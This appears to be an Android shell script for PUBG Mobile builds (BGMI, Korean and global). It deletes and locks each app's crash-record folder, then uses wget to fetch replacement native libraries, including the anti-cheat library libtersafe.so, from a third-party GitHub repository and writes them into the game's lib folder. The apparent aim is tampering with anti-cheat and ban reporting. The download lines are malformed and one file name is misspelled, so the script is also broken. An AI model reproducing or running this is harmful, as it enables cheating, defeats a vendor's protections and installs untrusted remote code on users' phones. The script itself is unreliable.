BGMI="/data/data/com.pubg.imobile/app_crashrecord"
KOREA="/data/data/com.pubg.krmobile/app_crashrecord"
GLOBAL="/data/data/com.tencent.ig/app_crashrecord"
rm -rf $BGMI
rm -rf $GLOBAL
rm -rf $KOREA
touch $BGMI
touch $GLOBAL
touch $KOREA
chmod 000 $BGMI
chmod 000 $KOREA
chmod 000 $GLOBAL
wget -O - https://github.com/Abhimehra/UPSILON/raw/main/libflutter.so cat > /data/data/com.pubg.imobile/lib/libflutter.ao 
wget -O - https://github.com/Abhimehra/UPSILON/raw/main/libgcloud.so cat > /data/data/com.pubg.imobile/lib/libgcloud.so 
wget -O - https://github.com/Abhimehra/UPSILON/raw/main/libsentry.so cat > /data/data/com.pubg.imobile/lib/libsentry.so 
wget -O - https://github.com/Abhimehra/UPSILON/raw/main/libtersafe.so cat > /data/data/com.pubg.imobile/lib/libtersafe.so 
chmod 755  /data/data/com.pubg.imobile/lib/*